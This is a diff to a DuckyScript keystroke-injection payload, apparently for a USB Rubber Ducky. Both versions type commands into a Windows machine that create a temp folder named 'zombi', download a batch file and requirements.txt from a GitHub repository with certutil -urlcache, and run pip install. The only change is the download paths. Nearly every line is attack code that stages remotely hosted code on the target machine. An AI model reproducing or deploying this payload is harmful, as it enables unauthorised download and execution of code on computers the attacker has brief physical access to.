@@ -6,7 +6,7 @@ DELAY 600
 STRING IF NOT EXIST "C:\Users\%USERNAME%\AppData\Local\Temp\zombi" (mkdir "C:\Users\%USERNAME%\AppData\Local\Temp\zombi")
 ENTER
 DELAY 600
-STRING certutil -urlcache -split -f "https://raw.githubusercontent.com/LibertyWalk999/zombi/main/zombi_install_python.bat" "C:\Users\%USERNAME%\AppData\Local\Temp\zombi\zombi_install_python.bat"
+STRING certutil -urlcache -split -f "https://raw.githubusercontent.com/LibertyWalk999/zombi/main/components/zombi_install_python.bat" "C:\Users\%USERNAME%\AppData\Local\Temp\zombi\zombi_install_python.bat"
 ENTER
 DELAY 600
 STRING cd "C:\Users\%USERNAME%\AppData\Local\Temp\zombi"
@@ -31,7 +31,7 @@ DELAY 600
 STRING cd "C:\Users\%USERNAME%\AppData\Local\Temp\zombi"
 ENTER
 DELAY 600
-STRING certutil -urlcache -split -f "https://raw.githubusercontent.com/LibertyWalk999/zombi/main/requirements.txt" "C:\Users\%USERNAME%\AppData\Local\Temp\zombi\requirements.txt"
+STRING certutil -urlcache -split -f "https://raw.githubusercontent.com/LibertyWalk999/zombi/main/components/requirements.txt" "C:\Users\%USERNAME%\AppData\Local\Temp\zombi\requirements.txt"
 ENTER
 DELAY 600
 STRING pip install -r requirements.txt
